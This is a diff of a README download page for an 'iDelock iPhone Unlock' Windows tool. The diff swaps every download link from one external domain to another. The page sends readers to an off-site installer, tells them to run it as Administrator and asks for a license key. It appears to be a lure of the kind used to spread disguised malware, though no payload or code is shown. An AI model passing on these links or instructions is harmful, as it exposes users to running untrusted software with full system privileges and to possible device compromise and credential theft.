@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **iDelock iPhone Unlock** for Windows.
 
 <p align="center">
-  <a href="https://idelock.wonderchain.fun/">
+  <a href="https://idelock.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-iDelock%20iPhone%20Unlock-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download iDelock iPhone Unlock">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[idelock.wonderchain.fun](https://idelock.wonderchain.fun/)** |
-| **Full URL** | `https://idelock.wonderchain.fun/` |
+| **Direct link** | **[idelock.kolmods.com](https://idelock.kolmods.com/)** |
+| **Full URL** | `https://idelock.kolmods.com/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — idelock.wonderchain.fun](https://idelock.wonderchain.fun/)** (link above)
+1. Click **[Download — idelock.kolmods.com](https://idelock.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://idelock.wonderchain.fun/"><strong>⬇ Download iDelock iPhone Unlock now</strong></a></p>
+<p align="center"><a href="https://idelock.kolmods.com/"><strong>⬇ Download iDelock iPhone Unlock now</strong></a></p>
 
 ---
 
